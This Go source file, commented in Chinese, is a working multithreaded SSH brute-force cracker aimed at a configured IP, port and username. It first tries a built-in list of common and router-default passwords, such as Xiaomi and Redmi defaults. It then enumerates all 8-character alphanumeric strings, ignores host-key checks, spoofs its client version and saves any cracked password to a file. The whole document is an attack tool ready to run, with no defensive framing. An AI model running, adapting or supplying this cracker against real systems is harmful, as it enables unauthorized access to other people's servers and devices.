package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
	"gopkg.in/yaml.v3"
)

// Config 配置结构体
type Config struct {
	TargetIP       string `yaml:"target_ip"`
	TargetPort     int    `yaml:"target_port"`
	TargetUsername string `yaml:"target_username"`
	ThreadNum      int    `yaml:"thread_num"`
	Timeout        int    `yaml:"timeout"`
	MaxCount       int    `yaml:"max_count"`
	MaxTime        int    `yaml:"max_time"`
	UseDictionary  bool   `yaml:"use_dictionary"`
	Redis          struct {
		Enabled  bool   `yaml:"enabled"`
		Host     string `yaml:"host"`
		Port     int    `yaml:"port"`
		Password string `yaml:"password"`
		DB       int    `yaml:"db"`
	} `yaml:"redis"`
}

// BruteForcer SSH暴力破解器
type BruteForcer struct {
	config       *Config
	passwordChan chan string
	resultChan   chan string
	wg           sync.WaitGroup
	ctx          context.Context
	cancel       context.CancelFunc
	attemptCount int64
	found        bool
	result       string
	mu           sync.Mutex
	startTime    time.Time
	redisClient  interface{}
	// 性能统计
	lastLogTime  time.Time
	lastAttempts int64
}

// NewBruteForcer 创建新的暴力破解器
func NewBruteForcer(config *Config) *BruteForcer {
	ctx, cancel := context.WithCancel(context.Background())
	bf := &BruteForcer{
		config:       config,
		passwordChan: make(chan string, config.ThreadNum*2),
		resultChan:   make(chan string, 1),
		ctx:          ctx,
		cancel:       cancel,
		startTime:    time.Now(),
	}

	// 初始化Redis客户端(暂时禁用)
	// if config.Redis.Enabled {
	// 	bf.redisClient = redis.NewClient(&redis.Options{
	// 		Addr:     fmt.Sprintf("%s:%d", config.Redis.Host, config.Redis.Port),
	// 		Password: config.Redis.Password,
	// 		DB:       config.Redis.DB,
	// 	})
	// }

	return bf
}

// loadConfig 加载配置文件
func loadConfig(filename string) (*Config, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, fmt.Errorf("读取配置文件失败: %v", err)
	}

	var config Config
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		return nil, fmt.Errorf("解析配置文件失败: %v", err)
	}

	// 验证配置参数
	if err := validateConfig(&config); err != nil {
		return nil, fmt.Errorf("配置验证失败: %v", err)
	}

	return &config, nil
}

// validateConfig 验证配置参数
func validateConfig(config *Config) error {
	if config.TargetIP == "" {
		return fmt.Errorf("目标IP地址不能为空")
	}
	if config.TargetPort <= 0 || config.TargetPort > 65535 {
		return fmt.Errorf("端口号必须在1-65535之间")
	}
	if config.TargetUsername == "" {
		return fmt.Errorf("用户名不能为空")
	}
	if config.ThreadNum <= 0 || config.ThreadNum > 200 {
		return fmt.Errorf("线程数必须在1-200之间")
	}
	if config.Timeout <= 0 || config.Timeout > 60 {
		return fmt.Errorf("超时时间必须在1-60秒之间")
	}
	if config.MaxCount < 0 {
		return fmt.Errorf("最大尝试次数不能为负数")
	}
	if config.MaxTime < 0 {
		return fmt.Errorf("最大运行时间不能为负数")
	}
	return nil
}

// generatePasswords 生成密码（先字典攻击，后暴力枚举）
func (bf *BruteForcer) generatePasswords() {
	defer close(bf.passwordChan)

	// 如果启用字典攻击，首先尝试常见密码字典
	if bf.config.UseDictionary {
		commonPasswords := []string{
			// 纯数字
			"12345678", "87654321", "11111111", "00000000",
			"12341234", "56785678", "98769876", "13579135",
			"24681357", "19900101", "20000101", "20230101",

			// 字母+数字组合
			"admin123", "root1234", "password", "qwerty12",
			"abc12345", "test1234", "user1234", "guest123",
			"admin888", "root0000", "xiaomi01", "redmi123",

			// 路由器常见密码
			"admin888", "12345678", "password", "admin123",
			"root1234", "xiaomi88", "redmi888", "miwifi01",
			"router01", "wifi1234", "internet", "network1",

			// 年份相关
			"20231234", "20221234", "20211234", "20201234",
			"19901234", "19951234", "20001234", "20101234",
		}

		// 发送常见密码
		for _, password := range commonPasswords {
			select {
			case <-bf.ctx.Done():
				return
			case bf.passwordChan <- password:
			}
		}
	}

	// 如果字典攻击失败，则进行暴力枚举
	// 字符集：数字和字母
	chars := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	charLen := len(chars)

	// 预分配密码字节数组，减少内存分配
	passwordBytes := make([]byte, 8)

	// 生成8位密码
	for i := 0; i < charLen; i++ {
		passwordBytes[0] = chars[i]
		for j := 0; j < charLen; j++ {
			passwordBytes[1] = chars[j]
			for k := 0; k < charLen; k++ {
				passwordBytes[2] = chars[k]
				for l := 0; l < charLen; l++ {
					passwordBytes[3] = chars[l]
					for m := 0; m < charLen; m++ {
						passwordBytes[4] = chars[m]
						for n := 0; n < charLen; n++ {
							passwordBytes[5] = chars[n]
							for o := 0; o < charLen; o++ {
								passwordBytes[6] = chars[o]
								for p := 0; p < charLen; p++ {
									select {
									case <-bf.ctx.Done():
										return
									default:
										passwordBytes[7] = chars[p]
										// 创建字符串副本发送到channel
										password := string(passwordBytes)
										bf.passwordChan <- password
									}
								}
							}
						}
					}
				}
			}
		}
	}
}

// trySSHLogin 尝试SSH登录
func (bf *BruteForcer) trySSHLogin(password string) bool {
	config := &ssh.ClientConfig{
		User: bf.config.TargetUsername,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(bf.config.Timeout) * time.Second,
		// 添加客户端版本信息
		ClientVersion: "SSH-2.0-OpenSSH_8.0",
	}

	addr := fmt.Sprintf("%s:%d", bf.config.TargetIP, bf.config.TargetPort)
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		// 只有认证成功但其他错误才返回true
		if err.Error() == "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain" {
			return false
		}
		// 网络错误或其他错误
		return false
	}
	defer client.Close()

	// 尝试执行一个简单命令验证连接
	session, err := client.NewSession()
	if err != nil {
		return true // 能建立连接就说明认证成功
	}
	defer session.Close()

	return true
}

// worker 工作协程
func (bf *BruteForcer) worker(id int) {
	defer bf.wg.Done()

	for {
		select {
		case <-bf.ctx.Done():
			return
		case password, ok := <-bf.passwordChan:
			if !ok {
				return
			}

			// 检查是否已找到密码
			if bf.found {
				return
			}

			// 检查最大尝试次数
			if bf.config.MaxCount > 0 {
				if atomic.LoadInt64(&bf.attemptCount) >= int64(bf.config.MaxCount) {
					return
				}
			}

			// 检查最大运行时间
			if bf.config.MaxTime > 0 {
				if time.Since(bf.startTime) >= time.Duration(bf.config.MaxTime)*time.Second {
					return
				}
			}

			currentCount := atomic.AddInt64(&bf.attemptCount, 1)

			// 性能统计和日志输出
			bf.mu.Lock()
			now := time.Now()
			if bf.lastLogTime.IsZero() {
				bf.lastLogTime = now
				bf.lastAttempts = currentCount
			}

			// 每5秒或前10次尝试输出统计信息
			if currentCount <= 10 || now.Sub(bf.lastLogTime) >= 5*time.Second {
				elapsed := now.Sub(bf.startTime)
				speed := float64(currentCount) / elapsed.Seconds()
				fmt.Printf("[Progress] Attempts: %d, Speed: %.1f/s, Current: %s, Runtime: %v\n", currentCount, speed, password, elapsed.Round(time.Second))
				bf.lastLogTime = now
				bf.lastAttempts = currentCount
			}
			bf.mu.Unlock()

			// 添加重试机制
			success := false
			for retry := 0; retry < 3; retry++ {
				if bf.trySSHLogin(password) {
					success = true
					break
				}
				// 短暂延迟后重试
				if retry < 2 {
					time.Sleep(100 * time.Millisecond)
				}
			}

			if success {
				bf.mu.Lock()
				if !bf.found {
					bf.found = true
					bf.result = password
					fmt.Printf("\n🎉 找到密码: %s\n", password)
				}
				bf.mu.Unlock()
				select {
				case bf.resultChan <- password:
				default:
				}
				return
			}
		}
	}
}

// savePassword 保存密码到文件
func (bf *BruteForcer) savePassword(password string) error {
	file, err := os.OpenFile("password.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(fmt.Sprintf("成功破解密码: %s\n时间: %s\n目标: %s@%s:%d\n\n",
		password,
		time.Now().Format("2006-01-02 15:04:05"),
		bf.config.TargetUsername,
		bf.config.TargetIP,
		bf.config.TargetPort))
	return err
}

// Start 开始暴力破解
func (bf *BruteForcer) Start() {
	fmt.Printf("开始SSH暴力破解...\n")
	fmt.Printf("目标: %s@%s:%d\n", bf.config.TargetUsername, bf.config.TargetIP, bf.config.TargetPort)
	fmt.Printf("线程数: %d\n", bf.config.ThreadNum)
	fmt.Printf("超时时间: %d秒\n", bf.config.Timeout)
	if bf.config.MaxCount > 0 {
		fmt.Printf("最大尝试次数: %d\n", bf.config.MaxCount)
	}
	if bf.config.MaxTime > 0 {
		fmt.Printf("最大运行时间: %d秒\n", bf.config.MaxTime)
	}
	fmt.Println("按Ctrl+C停止破解")
	fmt.Println(strings.Repeat("=", 50))

	// 启动密码生成器
	go bf.generatePasswords()

	// 启动工作协程
	for i := 0; i < bf.config.ThreadNum; i++ {
		bf.wg.Add(1)
		go bf.worker(i + 1)
	}

	// 等待结果或完成
	go func() {
		bf.wg.Wait()
		close(bf.resultChan)
	}()

	// 监听结果
	select {
	case password := <-bf.resultChan:
		if password != "" {
			fmt.Printf("\n🎉 破解成功！\n")
			fmt.Printf("密码: %s\n", password)
			fmt.Printf("用时: %v\n", time.Since(bf.startTime))
			fmt.Printf("尝试次数: %d\n", atomic.LoadInt64(&bf.attemptCount))

			// 保存密码到文件
			if err := bf.savePassword(password); err != nil {
				log.Printf("保存密码失败: %v", err)
			} else {
				fmt.Println("密码已保存到 password.txt")
			}
		}
	case <-bf.ctx.Done():
		fmt.Printf("\n破解已停止\n")
		fmt.Printf("用时: %v\n", time.Since(bf.startTime))
		fmt.Printf("尝试次数: %d\n", atomic.LoadInt64(&bf.attemptCount))
	}

	bf.cancel()
}

// Stop 停止暴力破解
func (bf *BruteForcer) Stop() {
	bf.cancel()
}

func mainCLI() {
	// 加载配置
	config, err := loadConfig("config.yaml")
	if err != nil {
		log.Fatalf("加载配置失败: %v", err)
	}

	// 创建暴力破解器
	bf := NewBruteForcer(config)

	// 设置信号处理
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n收到停止信号，正在停止...")
		bf.Stop()
	}()

	// 开始破解
	bf.Start()
}

func main() {
	// 检查是否有命令行参数来决定运行模式
	if len(os.Args) > 1 && os.Args[1] == "--gui" {
		// GUI模式
		gbf := NewGUIBruteForcer()
		gbf.createGUI()
	} else {
		// 命令行模式
		mainCLI()
	}
}
